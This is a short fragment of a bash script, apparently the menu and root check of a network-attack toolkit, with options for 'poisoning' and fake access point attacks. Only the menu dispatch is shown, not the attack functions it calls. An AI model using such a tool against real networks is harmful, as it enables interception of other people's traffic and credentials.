echo "q.  Quit current poisoning session"
echo
read -p "Choice: " mainchoice

case ${mainchoice} in
1) unset clean; f_prereqs ;;
2) unset clean; f_poisoning ;;
3) unset clean; f_fakeapattacks ;;
4) unset clean; f_DataReviewMenu ;;
5) f_checkexit ;;
1968) f_pbs ;;
Q|q) f_Quit ;;
*) f_mainmenu ;;
esac
}

# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!]\e[0m This script must be run as root" 1>&2
	exit 1
else
	mkdir /tmp/ec
	f_isxrunning
	f_xtermwindows
	f_prereq_check
	clean=1
	f_mainmenu
fi
